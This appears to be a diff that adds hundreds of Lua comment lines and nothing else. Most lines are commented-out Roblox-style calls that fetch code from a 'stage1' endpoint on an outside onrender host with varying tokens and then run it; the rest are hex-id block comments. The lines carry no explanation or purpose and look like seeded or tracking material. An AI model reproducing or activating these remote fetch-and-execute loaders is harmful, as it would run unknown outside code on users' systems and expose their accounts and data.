+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_82c03e6ccb9513e0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a4aead291266401a", true))()
+--[[ _071d6b6193bd313e15a8e565248ee1a5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_538fc18823af9a76", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b32453f0441b871e", true))()
+--[[ _8ee0edf643067fd20982978903465d4b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_368157435df7705a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1b3f8b9ffe6afbd5", true))()
+--[[ _cede5df5dd48d948e870da792dadf2c5 ]]
+--[[ _b6e35317d7c19c967b92ed3a76512537 ]]
+--[[ _e3dc45cf4d87194d17e7102e2c08c822 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f7933cd80e2586e6", true))()
+--[[ _16fe30f415f1e9f1e141455262d61725 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7fd54f7426c2ec49", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_caedc227fabdee98", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ebe2a988d50267ba", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_358fec151ce2506e", true))()
+--[[ _252e048bc44efd531efd0319cf85badb ]]
+--[[ _402ee4d8cf3f8f98b8f2660632b2b72d ]]
+--[[ _838b4063b6d22cc81b3f1b6a1f40129b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a5b5c808d7f28de1", true))()
+--[[ _6966c21d3922434350150a215fa426d2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b3551dd967b92896", true))()
+--[[ _ccd61173c58e6237bd59fab4fba2d1ec ]]
+--[[ _d48b0ea7b17cfa7b4ee68cdf50254395 ]]
+--[[ _712fb555548fc605415fc179b8a16e94 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_190262b97c9b78bd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e6df4d6ffb976ad5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a725b102881fb0eb", true))()
+--[[ _f6405722aadb49b893f6ac0d124a466a ]]
+--[[ _275d060c39ba324035f6de07e8811eab ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_09880716b4b37ac5", true))()
+--[[ _fc48bb59e42c414685659bf0e99dcce7 ]]
+--[[ _acdc99a407b137b805d811a8c81e18f9 ]]
+--[[ _d6de289af8992f74024c6cb7f241ddd4 ]]
+--[[ _8b59ac0fc312518370223be2a2134610 ]]
+--[[ _5e8af351ae839f2686ff9726e16b42b2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_154560631d31f779", true))()
+--[[ _1a86478564024d83884e08cfd135a651 ]]
+--[[ _e9987ba79bc519545976fece981cea2e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cad586781c2ec586", true))()
+--[[ _d10e0700a0822d0b087531ee00c88fa7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_501934be5483215f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_37922d7a6b799908", true))()
+--[[ _2be25607ad7636b278d350e0cf7c852c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5dbc08e20e2ea511", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ed4f455b25fc9ff2", true))()
+--[[ _50038123751d5af507270ec0f5d914e0 ]]
+--[[ _8ed0c45ca892f6d88020d747648b4682 ]]
+--[[ _4d6766048b8d392ae7780d89f57e40f4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6a07a349950b9481", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b38799292652bc16", true))()
+--[[ _997495e65999640ce91bb1d504deda39 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e71ff95061980acb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0f1ef022a326915a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_411d4b6b5bd8e3bc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4936ff638f7a760b", true))()
+--[[ _6b6bda6f58d6abb558542d9e0fd0c154 ]]
+--[[ _591c0e2300157212dfedfebe813b716e ]]
+--[[ _e2bf5b261398d39b2b3cf2f597753cba ]]
+--[[ _ae2adb3a7658334701535ba458cd7254 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a2754c6be98d2254", true))()
+--[[ _1c999114fa49479ddfef8b26ee5b0039 ]]
+--[[ _1a00de580043db223fd19500e46550f9 ]]
+--[[ _ea331cb6c58920a17695d5737e777144 ]]
+--[[ _94de09e034175fd555b9d53f98a924e9 ]]
+--[[ _085000298bc9ee1ea880ffc1811efc7d ]]
+--[[ _9835ee3413f90cc36628fa9f7409cf9c ]]
+--[[ _00e5f2f21dbdcd5dfae685fabb4e46b5 ]]
+--[[ _8bbcb669bffbb066db3cab470fc534a3 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b4487d646db1fd32", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a3dc79f5dd7f825d", true))()
+--[[ _8ad717792ceba2282f4ee5f00619743f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_240a62266547285d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c0f4937b7a874cf9", true))()
+--[[ _ead260783896a0a2293fbad63a5ae6e5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_94c8711dac71c528", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5476f8e0de3f6009", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_68ec26f9c4d37b3b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5ba363515aedf060", true))()
+--[[ _1f58a1f866c04c1875a52ab04a2df4a6 ]]
+--[[ _602583fbda48cf9e8dbdd3ea9a908a28 ]]
+--[[ _2ddec1f4febad3ed9b9b96fbe9f80b8b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5d02914878b0cc02", true))()
+--[[ _c58876ae848f69ae4ec51a3f3fa32c00 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e9cb69fb9eba87d9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ea9ce38af4e22dfc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d2b3e1c9a981439f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8fb6941d2e7f5bb8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_442425dd364fb26c", true))()
+--[[ _d9e9e85ec55d2e98b5b61b7d6b86caf9 ]]
+--[[ _96c42b8e1e49d9c51c6cfd34984bdc4b ]]
+--[[ _e14c61a3eac918d27d0e0ee9e5de5769 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cd68d0bd72768155", true))()
+--[[ _ed72957a46a4280c0623aa684bb83039 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cc8cbad1f75105fe", true))()
+--[[ _05f44893e45fb5a6ee57c8391c6adb76 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e4bca7428f5647cb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b1343dc731bf660a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b74da61788d989ce", true))()
+--[[ _a71b202ac12109b42f66a7ecc345e8c3 ]]
+--[[ _12cdaece9c2d5bbf9b516e0c5737b15d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f7e36b0bef5a1393", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_71064e69a8fd7eda", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4d565c75dd0e3b05", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f78c0edcfd2ad5ad", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_daf13b2e70d96a88", true))()
+--[[ _f2123b0c7dcc4b0e06738eaf8a816597 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_233abbf01b4ca3d2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ccadee3299a71f80", true))()
+--[[ _1663b3e7c06300e2d5fc3fbab6e3c62c ]]
+--[[ _df8581a6881090a1f365f35109dc9a06 ]]
+--[[ _e099af9b90f250461c9322d80766a7e6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b424ec36f5442d1e", true))()
+--[[ _4f226a6da312105c1c7f2ecc67866516 ]]
+--[[ _39b93916a8108c5073d87037adc94327 ]]
+--[[ _60dd1855245834aaacde20b19b2faa63 ]]
+--[[ _dd4705954a9f2998f13a1d4f44e750ff ]]
+--[[ _29455dcfd96b483c52da9bba44df02ca ]]
+--[[ _68b75cb9cc4219d4dbb61a2d4b130425 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_775f22c15cb5c93e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_20b53a8d4fb48323", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ed7d413cd526d909", true))()
+--[[ _db3ab083b1e8512d546ef88baba4e816 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8a288cd6723850cc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ec16206d6cace370", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f5cffb494fc37a7b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_61aca276e9ee70ae", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_de58ad98cbc4f747", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3502a6bc832843f0", true))()
+--[[ _b1034766a297034488086e0315dea2fd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_76eddece2b5a9d9f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e5403e8b27ccff42", true))()
+--[[ _24eaf6c360fa60c77aa536c510465d4c ]]
+--[[ _312e0051a93eaabe014d3ecefbd863e9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7d4d9e2c6f4a7d36", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_caab1ff1c90d0496", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b91f9e406bbd509c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f95d524bfc257a3", true))()
+--[[ _f0d97fcb041f7562c9ee5f26276b6b69 ]]
+--[[ _0ad5c69f1956ae13915c49e58ed56d8e ]]
+--[[ _d82512a3a8b6de764c8b7088130486f5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_de78a732cbe27694", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8914d83699a3e0a7", true))()
+--[[ _269c4838e1e514ff6bda9d07f88cf509 ]]
+--[[ _4b1bf5918c2e8eae68bbe495e69e84bc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cdb487cb2efd2b2e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_16cb0ddf38d0f768", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4cbf8e902fe7e7bf", true))()
+--[[ _569c25fa019c9c40e5d70b5e3b93f78b ]]
+--[[ _822a60bee2c85f1c4ecec29c2591b618 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_71af48bfa36198ca", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_75c5902b6caee129", true))()
+--[[ _79fb2562162b2c629273fe7d97c37761 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3220154e0e20c203", true))()
+--[[ _c12e7dac8d3268f31781e2904abd4a28 ]]
+--[[ _e0b3c9ebe357831fd23e907f93c9291e ]]
+--[[ _31272ddf4c33d09be4f3dba328346c31 ]]
+--[[ _d6450988c85361f745e8fca8a2c6b6d9 ]]
+--[[ _22049dcb0449b8f89ee9a3331ee33981 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_742aef9ac5f8ecf3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_54d74f467c8de120", true))()
+--[[ _54ce6dc5515d7a5b86e60ffd688e8a06 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bddc81ce0f41dd7a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_470097f55b3b33ed", true))()
+--[[ _3fac025230fe0c8aa0a560b781ee4bbf ]]
+--[[ _f3651294efd4c34de7e2a104ee25ee8b ]]
+--[[ _ae00f948127f7829b1bb8e1cc2ed888d ]]
+--[[ _a3a1e54f2b1c8fdc89917b89e07b751d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_487467932b66d199", true))()
+--[[ _a9d06a2e9de73752ce00cc8f114a57e6 ]]
+--[[ _db3a38488afb07e0fec66ae22acc747b ]]
+--[[ _7cb937e03058fcd4ad2af409d9a89c68 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1a7812f7ee34ee88", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6d49824c5c652025", true))()
+--[[ _ee76c446c0bbbf4075047f08595a0956 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_57ffa0f16115324d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b301b5f31031b057", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a611b7852ae94d19", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3a90f54941eb665d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b6837b70cb960d4b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ce9f40fa89a6181e", true))()
+--[[ _b8770b35040899e5fdb7a9a49b0fa7ec ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e9c466b668587cce", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8886438bf8987839", true))()
+--[[ _1583c6e6720fce91687ea0216bf835cf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_af137c80b3a8b06e", true))()
+--[[ _f33b81854301bc924e68cf3136a974a9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4b00059ec28086cf", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_44d04cdbafde2084", true))()
+--[[ _f36ec07e15350788b5b9040013d0451c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_871b14ac5dc83a80", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3f3c885546ab5b75", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_90a2524bded59936", true))()
+--[[ _084f81e2ca697e3c4eddb893d5e84780 ]]
+--[[ _333781ce203f5f1b2d1e4f41c0463b5e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7b3e472bdd9afe57", true))()
+--[[ _1fa3ce65301ec42454d686391f41d499 ]]
+--[[ _814306e3b0b21146a3def79e5d50c140 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c604b1e0576db79e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7859f2d621e5c50f", true))()
+--[[ _3a85a370af1149855c7c5820c1e56a49 ]]
+--[[ _2fa5e5391eaa4e00b2df107586a36c9b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bbb7d21680194938", true))()
+--[[ _a1d093f9d23ad014fd043feb8dd962cd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_41a174ac0910be3d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f28b6e6768bf9b30", true))()
+--[[ _bfd4cef27fbc79bea6a46cc1cfc52dd4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5984c3db50f53633", true))()
+--[[ _fa130e9b60a6b4935d98ab9bc62f9331 ]]
+--[[ _c8b4fdc814f220d90264320577299519 ]]
+--[[ _6ce451cfcf43a736782a92a989b611ec ]]
+--[[ _7be0efd23f03850120400aafc038d5df ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1bc7a3cad885a03c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bdf061695757693e", true))()
+--[[ _e3d1d60a308db194f50afdc90b1c20af ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_644e132678a3f257", true))()
+--[[ _af9e95e1278e4694f72524787b764dd8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6d5f193dc1e2434c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ce86375587d87685", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5832b481065ad573", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f372f2e66782baa5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_486d31565cde625c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6a061c0a48e90c3b", true))()
+--[[ _5c49bf7844689ed0a7a4d5092c6f8d6e ]]
+--[[ _d9966c41be849f098e101734e088e944 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_95cf03aa7d3d45e8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0c46d48a19787379", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c93b90ad48d6de82", true))()
+--[[ _0947026500ea6ef26985d7b1265639c7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6bc990929e9ad6e1", true))()
+--[[ _7eb9f1008de1b4b806e0ab32090eafc9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b352a279a3b12462", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_74665e2074f5a71c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_aecb561dbd595617", true))()
+--[[ _fb97fe719045f4f2b9e5242a1db6a7e8 ]]
+--[[ _728288c0b7ca8fc21b72858d763d8c80 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f02f2e47b053ca6b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d7f77848569d58c5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_09a36ef95dc96312", true))()
+--[[ _81b9adda636cd8d145ece7d9ef1098ab ]]
+--[[ _42b88e972a3792039d2d7d00cecc3db0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_81578f6f55ebebbf", true))()
+--[[ _07270fddb9355cef5c49ec29be0df035 ]]
+--[[ _1b55f08e3b960fd672af8a9a86d847c9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7980d3a87e7ce1c4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0dd9b405ac09d024", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_85ffb6e2edd1bf91", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d40a8781713a58ab", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_dd011b8cb6fe432f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0de64f182272f9b3", true))()
+--[[ _63947db8465e62718c2a1067d1e01df7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_db662a49af20b2ee", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_af384cbf322b49e4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_90ac7b9710fcb4f3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c1a074a7cac168ea", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_485821188cfe7eb3", true))()
+--[[ _f75c06a14beff8faa32093d71e17ffae ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7f46246ab15fa1f1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6ac677bc5c3dae0e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7a6ed2a45d0a7206", true))()
+--[[ _6e2810f507460d0ec063f68dc2fcb4c5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_396ae1bad0e323de", true))()
+--[[ _eabbbad642e560db63f0060ee9881013 ]]
+--[[ _5254716c2811bfa1d026db8856ed6087 ]]
+--[[ _a6250e9b3b17f55f29ccb0d639350a8a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_39aca20a109c3551", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cfbb1ffaa00e81c4", true))()
+--[[ _f67a66e7a4764fd87b569aef64a7431a ]]
+--[[ _2ea0d617e5c134a1c3fc954cc9c7453b ]]
+--[[ _2bdb17a8e4b452d97caecc9e8129ff95 ]]
+--[[ _651bd8de6ec9ade2f81d188670535dfc ]]
+--[[ _615fafc9bc3dcdd54964d81190e46051 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2c06ab553913a433", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_47eaf715191b10b8", true))()
+--[[ _803c248b6832a84a67adc0ff840ef44c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bfedb6b3fa95439c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3723859afc837134", true))()
+--[[ _843ebb1ab65a78d68eb7471252590e96 ]]
+--[[ _c5f3fa81bc5bb9db6a4165f81cf9a8af ]]
+--[[ _0fc1a9178c1498be8f0765415ebe47ad ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_078c7b8678dfa6eb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_96560bd9ccd3a2d6", true))()
+--[[ _45f36a2a8eb84264e8735b396a8924a1 ]]
+--[[ _0e0de9fc735aae040f422f77e6a4e6cf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_87c2a26eca5e61f3", true))()
+--[[ _8e7afde0af967b7a0a9f60db5db5b597 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_35df46097feda2aa", true))()
+--[[ _b44c54b46d5ff53e3fc97a495014dd80 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_79a6d08ffdb9604d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2e78c4948331aefe", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1127647aed6af4ca", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b12afe0b1e090e05", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e8c3c3dd7ea7f50d", true))()
+--[[ _2d2cfaa6533d665cd2c526241e7b6095 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_34e8e46c9378a618", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_485ec0b414051b74", true))()
+--[[ _210c8cf2535288e46a1b205748e876b4 ]]
+--[[ _fccb70f6198a266d39f7e537cfa9f363 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_221a4f8455b123c5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cece28a878040e67", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_792c7574183798cb", true))()
+--[[ _38017c5cb2a986cad74b35e6899b3520 ]]
+--[[ _23f81223def1e65ee1f4c2ca6e448176 ]]
+--[[ _a1eeba57641ba8feb052663fed0ded26 ]]
+--[[ _1c14ccaf8e9971655b288218bd1dc07f ]]
+--[[ _232b302013bba465aeecfd1d74177585 ]]
+--[[ _66f7f3d75c72daeabadd2aa350048cf5 ]]
+--[[ _929ef65145ae08daaccc75615dfb6d6f ]]
+--[[ _4155990a4a8ff73ef0c3e2e1b12aa027 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_56d441c8effae7b2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_18f2d18019f4f44b", true))()
+--[[ _9b880c631945c49b0d182e6300791c00 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_40b6ff96a8a92d3f", true))()
+--[[ _f380bd82d7784a047f77e667c3be8fe0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_41efe6d8069aa23f", true))()
+--[[ _d7bde1a331dd25f3fa0fec28202c6f04 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_24a9d4647962a003", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f8fe0efc690df9cd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_68496588588c9724", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_995992bbf2cbda78", true))()
+--[[ _c74ab92df048115c3bcce7a118f8fd57 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_50ac84b3ce053707", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_05d3129262156ecf", true))()
+--[[ _4e51e819fad775fc5f2bc9231ea73c33 ]]
+--[[ _ad0efdbec918a176825eb36489b57379 ]]
+--[[ _644577d68acba9d25c4cfec8524dd092 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f26a544e2742b2d0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_60b68beb7428a417", true))()
+--[[ _56a4fbc02f9cd54542de29f2f6700498 ]]
+--[[ _b91e9c88ac5eb7e6deb25282ac7f5128 ]]
+--[[ _04ffac016c5ae5c48eb535bf9b7159ee ]]
+--[[ _5a38eece9c40fb1174779628ed98d65a ]]
+--[[ _992d0a49ad55aa6f5485499bf5eead59 ]]
+--[[ _d19a0def3d79eee2d274a5d0239ad573 ]]
+--[[ _3bea29836cf11ba46e08b44625f85563 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8dbb29fc943fa4c1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b3e579639870bf9f", true))()
+--[[ _c840af9f73eb4f09cb78443f81bade4f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d8cbec9d0b0dd1f0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8aa3df58f4de2042", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7ee50432ab9ec1a1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1ed752e2edab35a9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c492d8a21538c2cd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_feadf80da17d023d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_561ece04fbf90118", true))()
